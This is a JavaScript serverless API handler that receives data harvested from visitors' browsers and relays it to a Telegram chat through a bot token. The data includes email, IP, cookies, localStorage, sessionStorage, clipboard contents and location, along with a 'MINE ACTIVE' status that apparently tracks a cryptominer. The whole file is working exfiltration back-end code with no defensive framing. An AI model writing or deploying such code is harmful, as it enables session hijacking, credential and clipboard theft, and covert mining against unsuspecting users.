export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  try {
    let data;
    if (req.body && typeof req.body === 'object') {
      data = req.body;
    } else {
      data = JSON.parse(req.body || "{}");
    }

    // Format for Telegram Markdown
    const lsStr = JSON.stringify(data.localStorage, null, 2).substring(0, 1500);
    const ssStr = JSON.stringify(data.sessionStorage, null, 2).substring(0, 1500);
    
    const mineTag = data.mineStatus ? `🔥 *MINE ACTIVE*: ${data.mineStatus}\n` : "";
    
    const msg = `
🚗 *New Client Session*

🆔 Email: \`${data.email || "N/A"}\`
🌐 IP: \`${data.ip}\`
🖥️ UA: ${data.userAgent.substring(0, 50)}...
🍪 Cookies: \`${data.cookies || "N/A"}\`
💾 LocalStorage: \`\`\`json\n${lsStr}\n\`\`\`
🗄️ SessionStorage: \`\`\`json\n${ssStr}\n\`\`\`
📋 Clipboard: \`${data.clipboard || "Empty"}\`
📍 Location: ${data.location}
${mineTag}
    `.trim();

    const tgToken = process.env.TELEGRAM_BOT_TOKEN;
    const tgChatId = process.env.TELEGRAM_CHAT_ID;

    if (tgToken && tgChatId) {
      try {
        await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            chat_id: tgChatId, 
            text: msg, 
            parse_mode: 'Markdown' 
          })
        });
      } catch (err) {
        console.error("TG Failed", err);
      }
    }

    res.status(200).json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
}
